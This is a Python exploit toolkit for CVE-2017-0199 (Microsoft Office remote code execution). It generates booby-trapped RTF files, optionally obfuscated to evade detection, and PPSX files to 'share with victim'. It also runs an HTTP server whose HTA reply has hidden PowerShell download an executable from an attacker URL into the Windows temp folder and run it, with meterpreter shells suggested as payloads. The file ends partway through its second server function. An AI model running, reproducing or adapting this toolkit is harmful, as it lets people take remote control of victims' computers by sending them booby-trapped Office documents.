#!/usr/bin/env python
'''

                                                        ## Exploit toolkit CVE-2017-0199 - v4.0 (https://github.com/bhdresh/CVE-2017-0199) ##

Download: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41894.zip
'''
import os,sys,thread,socket,sys,getopt,binascii,shutil,tempfile
from random import randint
from random import choice
from string import ascii_uppercase
from zipfile import ZipFile, ZIP_STORED, ZipInfo


BACKLOG = 50            # how many pending connections queue will hold
MAX_DATA_RECV = 999999  # max number of bytes we receive at once
DEBUG = True            # set to True to see the debug msgs
def main(argv):
    # Host and Port information
    global port
    global host
    global filename
    global docuri
    global payloadurl
    global payloadlocation
    global custom
    global mode
    global obfuscate
    global payloadtype
    filename = ''
    docuri = ''
    payloadurl = ''
    payloadlocation = ''
    custom = ''
    port = int("80")
    host = ''
    mode = ''
    obfuscate = int("0")
    payloadtype = 'rtf'

    # Capture command line arguments
    try:
        opts, args = getopt.getopt(argv,"hM:w:u:p:e:l:H:x:t:",["mode=","filename=","docuri=","port=","payloadurl=","payloadlocation=","custom=","obfuscate=","payloadtype="])
    except getopt.GetoptError:
        print 'Usage: python '+sys.argv[0]+' -h'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
                print "\nThis is a handy toolkit to exploit CVE-2017-0199 (Microsoft Office RCE)\n"
                print "Modes:\n"
                print " -M gen                                          Generate Malicious file only\n"
                print "             Generate malicious payload:\n"
                print "             -w <Filename.rtf/Filename.ppsx>     Name of malicious RTF/PPSX file (Share this file with victim).\n"
                print "             -u <http://attacker.com/test.hta>   The path to an HTA/SCT file. Normally, this should be a domain or IP where this tool is running.\n"
		print "                                                 For example, http://attacker.com/test.doc (This URL will be included in malicious file and\n"
                print "                                                 will be requested once victim will open malicious RTF/PPSX file.\n"
                print "             -t RTF|PPSX (default = RTF)         Type of the file to be generated.\n"
                print "             -x 0|1  (RTF only)                  Generate obfuscated RTF file. 0 = Disable, 1 = Enable.\n"
                print " -M exp                                          Start exploitation mode\n"
                print "             Exploitation:\n"
                print "             -t RTF|PPSX (default = RTF)         Type of file to be exolited.\n"
		print "             -H </tmp/custom>                    Local path of a custom HTA/SCT file which needs to be delivered and executed on target.\n"
                print "                                                 NOTE: This option will not deliver payloads specified through options \"-e\" and \"-l\".\n"
		print "             -p <TCP port:Default 80>            Local port number.\n"
                print "             -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.\n"
                print "             -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.\n"
                sys.exit()
        elif opt in ("-M","--mode"):
            mode = arg
        elif opt in ("-w", "--filename"):
            filename = arg
        elif opt in ("-u", "--docuri"):
            docuri = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        elif opt in ("-e", "--payloadurl"):
            payloadurl = arg
        elif opt in ("-l", "--payloadlocation"):
            payloadlocation = arg
	elif opt in ("-H","--custom"):
            custom  = arg
        elif opt in ("-x","--obfuscate"):
            obfuscate = int(arg)
        elif opt in ("-t","--payloadtype"):
            payloadtype = arg
    if "gen" in mode:
        if (len(filename)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        if (len(docuri)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        if (len(payloadtype)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        if payloadtype.upper() == 'RTF':
            if obfuscate == 1:
            	print "Generating obfuscated RTF file.\n"
            	generate_exploit_obfuscate_rtf()
            	sys.exit()
            if obfuscate == 0:
            	print "Generating normal RTF payload.\n"
            	generate_exploit_rtf()
            	sys.exit()
            sys.exit()
        if payloadtype.upper() == 'PPSX':
            print "Generating normal PPSX payload.\n"
	    generate_exploit_ppsx()
            sys.exit()
        if payloadtype.upper() != 'RTF' and payloadtype.upper() != 'PPSX':
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        mode = 'Finished'
    if "exp" in mode:
        if payloadtype.upper() == 'RTF':
	    if (len(custom)>1):
	        print "Running exploit mode (Deliver Custom HTA) - waiting for victim to connect"
                exploitation_rtf()
	        sys.exit()
            if (len(payloadurl)<1):
                print 'Usage: python '+sys.argv[0]+' -h'
                sys.exit()
            if (len(payloadurl)>1 and len(payloadlocation)<1):
                print "Running exploit mode (Deliver HTA with remote payload) - waiting for victim to connect"
                exploitation_rtf()
                sys.exit()
            print "Running exploit mode (Deliver HTA + Local Payload) - waiting for victim to connect"
            exploitation_rtf()
            mode = 'Finished'
	if payloadtype.upper() == 'PPSX':
	    if (len(custom)>1):
	        print "Running exploit mode (Deliver Custom SCT) - waiting for victim to connect"
                exploitation_ppsx()
	        sys.exit()
            if (len(payloadurl)<1):
                print 'Usage: python '+sys.argv[0]+' -h'
                sys.exit()
            if (len(payloadurl)>1 and len(payloadlocation)<1):
                print "Running exploit mode (Deliver SCT with remote payload) - waiting for victim to connect"
                exploitation_ppsx()
                sys.exit()
            print "Running exploit mode (Deliver SCT + Local Payload) - waiting for victim to connect"
            exploitation_ppsx()
            mode = 'Finished'
        if not "Finished" in mode:
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
def generate_exploit_rtf():
    # Preparing malicious RTF
    s = docuri
    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
    docuri_pad_len = 224 - len(docuri_hex)
    docuri_pad = "0"*docuri_pad_len
    uri_hex = "010000020900000001000000000000000000000000000000a4000000e0c9ea79f9bace118c8200aa004ba90b8c000000"+docuri_hex+docuri_pad+"00000000795881f43b1d7f48af2c825dc485276300000000a5ab0000ffffffff0609020000000000c00000000000004600000000ffffffff0000000000000000906660a637b5d201000000000000000000000000000000000000000000000000100203000d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    
    payload = "{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\n"
    payload += "{\\info\n"
    payload += "{\\author }\n"
    payload += "{\\operator }\n"
    payload += "}\n"
    payload += "{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\n"
    payload += "{\n"
    payload += "{\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\n"
    payload += "{\\*\\objclass Word.Document.8}\n"
    payload += "{\\*\\objdata 0105000002000000\n"
    payload += "090000004f4c45324c696e6b000000000000000000000a0000\n"
    payload += "d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "fffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff020000000003000000000000c000000000000046000000000000000000000000704d\n"
    payload += "6ca637b5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000200ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000\n"
    payload += "000000000000000000000000f00000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000\n"
    payload += "0000000000000000000004000000060000000000000003004c0069006e006b0049006e0066006f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000200ffffffffffffffffffffffff000000000000000000000000000000000000000000000000\n"
    payload += "00000000000000000000000005000000b700000000000000010000000200000003000000fefffffffeffffff0600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += uri_hex+"\n"
    payload += "0105000000000000}\n"
    payload += "{\\result {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 }}}}\n"
    payload += "{\\*\\datastore }\n"
    payload += "}\n"
    f = open(filename, 'w')
    f.write(payload)
    f.close()
    print "Generated "+filename+" successfully"



def generate_exploit_obfuscate_rtf():
    # Preparing malicious obfuscated RTF
    var1 = " "
    var2 = "\r\n"
    var3 = "\t"
    var4 = ''.join(choice(ascii_uppercase) for i in range(randint(3,10)))
    var5 = "{\*\\"+var4+"}"
    var6 = binascii.b2a_hex(os.urandom(15))
    #var6 = "0011002e1faa"
    s = docuri
    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
    docuri_pad_len = 224 - len(docuri_hex)
    docuri_pad = "0"*docuri_pad_len
    new_docuri_hex = docuri_hex.replace('00', '{\*\\'+var6+'}00')
    uri_hex = "010000020900000001000000000000000000000000000000a4000000"+"e"+var5*randint(0,10)+"0"+var5*randint(0,10)+"c"+var5*randint(0,10)+"9"+var5*randint(0,10)+"e"+var5*randint(0,10)+"a"+var5*randint(0,10)+"7"+var5*randint(0,10)+"9"+var5*randint(0,10)+"f"+var5*randint(0,10)+"9"+var5*randint(0,10)+"b"+var5*randint(0,10)+"a"+var5*randint(0,10)+"c"+var5*randint(0,10)+"e"+var5*randint(0,10)+"1"+var5*randint(0,10)+"1"+var5*randint(0,10)+"8"+var5*randint(0,10)+"c"+var5*randint(0,10)+"8"+var5*randint(0,10)+"2"+var5*randint(0,10)+"0"+var5*randint(0,10)+"0"+var5*randint(0,10)+"a"+var5*randint(0,10)+"a"+var5*randint(0,10)+"0"+var5*randint(0,10)+"0"+var5*randint(0,10)+"4"+var5*randint(0,10)+"b"+var5*randint(0,10)+"a"+var5*randint(0,10)+"9"+var5*randint(0,10)+"0"+var5*randint(0,10)+"b"+var5*randint(0,10)+"8c000000"+new_docuri_hex+docuri_pad+"00000000795881f43b1d7f48af2c825dc485276300000000a5ab0000ffffffff0609020000000000c00000000000004600000000ffffffff0000000000000000906660a637b5d201000000000000000000000000000000000000000000000000100203000d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    
    payload = "{\\rtv0"+var1*randint(0,100)+"\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\n"
    payload += "{\\info\n"
    payload += "{\\author }\n"
    payload += "{\\operator }\n"
    payload += "}\n"
    payload += "{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\n"
    payload += "{\n"
    payload += "{\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\n"
    payload += "{\\*\\objclass \\'57\\'6f\\'72\\'64.Document.8}\n"
    payload += "{\\*\\objdata 0"+var2*randint(0,10)+var3*randint(0,10)+"1"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"5"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"2"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0"+var2*randint(0,10)+var3*randint(0,10)+"0\n"
    payload += "090000004f4c45324c696e6b000000000000000000000a0000\n"
    payload += "d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "fffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff020000000003000000000000c000000000000046000000000000000000000000704d\n"

    payload += "6ca637b5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000200ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000\n"
    payload += "000000000000000000000000f00000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000\n"
    payload += "0000000000000000000004000000060000000000000003004c0069006e006b0049006e0066006f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000200ffffffffffffffffffffffff000000000000000000000000000000000000000000000000\n"
    payload += "00000000000000000000000005000000b700000000000000010000000200000003000000fefffffffeffffff0600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += uri_hex+"\n"
    payload += "0105000000000000}\n"
    payload += "{\\result {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 }}}}\n"
    payload += "{\\*\\datastore }\n"
    payload += "}\n"
    f = open(filename, 'w')
    f.write(payload)
    f.close()
    print "Generated obfuscated "+filename+" successfully"

def generate_exploit_ppsx():
# Preparing malicious PPSX
	shutil.copy2('template/template.ppsx', filename)
	class UpdateableZipFile(ZipFile):
	    """
	    Add delete (via remove_file) and update (via writestr and write methods)
	    To enable update features use UpdateableZipFile with the 'with statement',
	    Upon  __exit__ (if updates were applied) a new zip file will override the exiting one with the updates
	    """

	    class DeleteMarker(object):
		pass

	    def __init__(self, file, mode="r", compression=ZIP_STORED, allowZip64=False):
		# Init base
		super(UpdateableZipFile, self).__init__(file, mode=mode,
		                                        compression=compression,
		                                        allowZip64=allowZip64)
		# track file to override in zip
		self._replace = {}
		# Whether the with statement was called
		self._allow_updates = False

	    def writestr(self, zinfo_or_arcname, bytes, compress_type=None):
		if isinstance(zinfo_or_arcname, ZipInfo):
		    name = zinfo_or_arcname.filename
		else:
		    name = zinfo_or_arcname
		# If the file exits, and needs to be overridden,
		# mark the entry, and create a temp-file for it
		# we allow this only if the with statement is used
		if self._allow_updates and name in self.namelist():
		    temp_file = self._replace[name] = self._replace.get(name,
		                                                        tempfile.TemporaryFile())
		    temp_file.write(bytes)
		# Otherwise just act normally
		else:
		    super(UpdateableZipFile, self).writestr(zinfo_or_arcname,
		                                            bytes, compress_type=compress_type)

	    def write(self, filename, arcname=None, compress_type=None):
		arcname = arcname or filename
		# If the file exits, and needs to be overridden,
		# mark the entry, and create a temp-file for it
		# we allow this only if the with statement is used
		if self._allow_updates and arcname in self.namelist():
		    temp_file = self._replace[arcname] = self._replace.get(arcname,
		                                                           tempfile.TemporaryFile())
		    with open(filename, "rb") as source:
		        shutil.copyfileobj(source, temp_file)
		# Otherwise just act normally
		else:
		    super(UpdateableZipFile, self).write(filename, 
		                                         arcname=arcname, compress_type=compress_type)

	    def __enter__(self):
		# Allow updates
		self._allow_updates = True
		return self

	    def __exit__(self, exc_type, exc_val, exc_tb):
		# call base to close zip file, organically
		try:
		    super(UpdateableZipFile, self).__exit__(exc_type, exc_val, exc_tb)
		    if len(self._replace) > 0:
		        self._rebuild_zip()
		finally:
		    # In case rebuild zip failed,
		    # be sure to still release all the temp files
		    self._close_all_temp_files()
		    self._allow_updates = False

	    def _close_all_temp_files(self):
		for temp_file in self._replace.itervalues():
		    if hasattr(temp_file, 'close'):
		        temp_file.close()

	    def remove_file(self, path):
		self._replace[path] = self.DeleteMarker()

	    def _rebuild_zip(self):
		tempdir = tempfile.mkdtemp()
		try:
		    temp_zip_path = os.path.join(tempdir, 'new.zip')
		    with ZipFile(self.filename, 'r') as zip_read:
		        # Create new zip with assigned properties
		        with ZipFile(temp_zip_path, 'w', compression=self.compression,
		                     allowZip64=self._allowZip64) as zip_write:
		            for item in zip_read.infolist():
		                # Check if the file should be replaced / or deleted
		                replacement = self._replace.get(item.filename, None)
		                # If marked for deletion, do not copy file to new zipfile
		                if isinstance(replacement, self.DeleteMarker):
		                    del self._replace[item.filename]
		                    continue
		                # If marked for replacement, copy temp_file, instead of old file
		                elif replacement is not None:
		                    del self._replace[item.filename]
		                    # Write replacement to archive,
		                    # and then close it (deleting the temp file)
		                    replacement.seek(0)
		                    data = replacement.read()
		                    replacement.close()
		                else:
		                    data = zip_read.read(item.filename)
		                zip_write.writestr(item, data)
		    # Override the archive with the updated one
		    shutil.move(temp_zip_path, self.filename)
		finally:
		    shutil.rmtree(tempdir)
	
	with UpdateableZipFile(filename, "a") as o:
	    o.writestr("ppt/slides/_rels/slide1.xml.rels", "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
	<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"script:"+docuri+"\" TargetMode=\"External\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout\" Target=\"../slideLayouts/slideLayout1.xml\"/><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/vmlDrawing\" Target=\"../drawings/vmlDrawing1.vml\"/></Relationships>")
	print "Generated "+filename+" successfully"


def exploitation_rtf():
 
    print "Server Running on ",host,":",port

    try:
        # create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # associate the socket to host and port
        s.bind((host, port))

        # listenning
        s.listen(BACKLOG)
    
    except socket.error, (value, message):
        if s:
            s.close()
        print "Could not open socket:", message
        sys.exit(1)

    # get the connection from client
    while 1:
        conn, client_addr = s.accept()

        # create a thread to handle request
        thread.start_new_thread(server_thread, (conn, client_addr))
        
    s.close()

def server_thread(conn, client_addr):

    # get the request from browser
    try:
        request = conn.recv(MAX_DATA_RECV)
        if (len(request) > 0):
            # parse the first line
            first_line = request.split('\n')[0]
            
            # get method
            method = first_line.split(' ')[0]
            # get url
            try:
                url = first_line.split(' ')[1]
            except IndexError:
                print "Invalid request from "+client_addr[0]
                conn.close()
                sys.exit(1)
 		# check if custom HTA flag is set
	    if (len(custom)>1):
                print "Received request for custom HTA from "+client_addr[0]
                try:
                    size = os.path.getsize(custom)
                except OSError:
                    print "Unable to read exe - "+custom
                    conn.close()
                    sys.exit(1)
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 18:56:41 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 16:56:22 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: "+str(size)+"\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/hta\r\n\r\n"
                with open(custom) as fin:
                    data +=fin.read()
                    conn.send(data)
                    conn.close()
                    sys.exit(1)
		conn.close()
		sys.exit(1)
            check_exe_request = url.find('.exe')
            if (check_exe_request > 0):
                print "Received request for payload from "+client_addr[0]
                try:
                    size = os.path.getsize(payloadlocation)
                except OSError:
                    print "Unable to read "+payloadlocation
                    conn.close()
                    sys.exit(1)
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 18:56:41 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 16:56:22 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: "+str(size)+"\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/x-msdos-program\r\n\r\n"
                with open(payloadlocation) as fin:
                    data +=fin.read()
                    conn.send(data)
                    conn.close()
                    sys.exit(1)
            if method in ['GET', 'get']:
                print "Received GET method from "+client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:11:03 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 17:30:47 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 315\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/hta\r\n\r\n<script>\na=new ActiveXObject(\"WScript.Shell\");\na.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\\'"+payloadurl+"\\', \\'c:/windows/temp/shell.exe\\'); c:/windows/temp/shell.exe', 0);window.close();\n</script>\r\n"
                conn.send(data)
                conn.close()
            if method in ['OPTIONS', 'options']:
                print "Receiver OPTIONS method from "+client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:47:14 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nAllow: OPTIONS,HEAD,GET\r\nContent-Length: 0\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/html"
                conn.send(data)
                conn.close()
            if method in ['HEAD', 'head']:
                print "Received HEAD method from "+client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:11:03 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 17:30:47 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 315\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/doc\r\n\r\n"
                conn.send(data)
                conn.close()
                sys.exit(1)
    except socket.error, ex:
        print ex


def exploitation_ppsx():
 
    print "Server Running on ",host,":",port

    try:
        # create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # associate the socket to host and port
        s.bind((host, port))

        # listenning
        s.listen(BACKLOG)
    
    except socket.error, (value, message):
        if s:
            s.close()
        print "Could not open socket:", message
        sys.exit(1)

    # get the connection from client
    while 1:
        conn, client_addr = s.accept()

        # create a thread to handle request
        thread.start_new_thread(server_thread, (conn, client_addr))
        
    s.close()

def server_thread(conn, client_addr):

    # get the request from browser
    try:
        request = conn.recv(MAX_DATA_RECV)
        if (len(request) > 0):
            # parse the first line
            first_line = request.split('\n')[0]
            
            # get method
            method = first_line.split(' ')[0]
            # get url
            try:
                url = first_line.split(' ')[1]
            except IndexError:
                print "Invalid request from "+client_addr[0]
                conn.close()
                sys.exit(1)
 		# check if custom SCT flag is set
	    if (len(custom)>1):
                print "Received request for custom SCT from "+client_addr[0]
                try:
                    size = os.path.getsize(custom)
                except OSError:
                    print "Unable to read custom SCT file - "+custom
                    conn.close()
                    sys.exit(1)
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 18:56:41 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 16:56:22 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: "+str(size)+"\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/scriptlet\r\n\r\n"
                with open(custom) as fin:
                    data +=fin.read()
                    conn.send(data)
                    conn.close()
                    sys.exit(1)
		conn.close()
		sys.exit(1)
            check_exe_request = url.find('.exe')
            if (check_exe_request > 0):
                print "Received request for payload from "+client_addr[0]
                try:
                    size = os.path.getsize(payloadlocation)
                except OSError:
                    print "Unable to read"+payloadlocation
                    conn.close()
                    sys.exit(1)
